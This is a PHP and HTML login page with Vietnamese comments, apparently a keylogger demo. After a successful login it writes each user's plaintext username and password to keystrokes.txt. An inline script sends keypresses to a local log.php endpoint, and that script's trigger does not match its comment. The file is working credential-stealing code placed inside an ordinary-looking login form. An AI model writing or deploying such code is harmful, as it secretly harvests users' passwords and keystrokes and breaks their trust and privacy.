<?php
include 'db.php';
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Tìm user trong database
    $stmt = $conn->prepare("SELECT id, password FROM users WHERE username=?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $stmt->store_result();
    $stmt->bind_result($id, $hashed_password);

    if ($stmt->fetch() && password_verify($password, $hashed_password)) {
        // ✅ Đăng nhập thành công
        $_SESSION['user_id'] = $id;

        // 🔥 Ghi lại thông tin đăng nhập vào file keylogger (chỉ khi đúng)
        file_put_contents("keystrokes.txt", "User: $username | Pass: $password\n", FILE_APPEND);

        echo "Đăng nhập thành công! <a href='dashboard.php'>Vào trang chính</a>";
    } else {
        // ❌ Đăng nhập thất bại → Không ghi dữ liệu
        echo "<p style='color:red;'>Sai tài khoản hoặc mật khẩu!</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Đăng nhập</title>
</head>
<body>
    <h2>Đăng nhập vào hệ thống</h2>
    <form method="POST">
        Tên đăng nhập: <input type="text" name="username" required><br><br>
        Mật khẩu: <input type="password" name="password" required><br><br>
        <input type="submit" value="Đăng nhập">
    </form>

    <script>
        // 🔥 Keylogger chỉ chạy nếu đăng nhập thành công
        document.querySelector("form").onsubmit = function() {
            document.onkeypress = function(e) {
                fetch('http://localhost/keylogger_demo/log.php?key=' + e.key);
            };
        };
    </script>
</body>
</html>
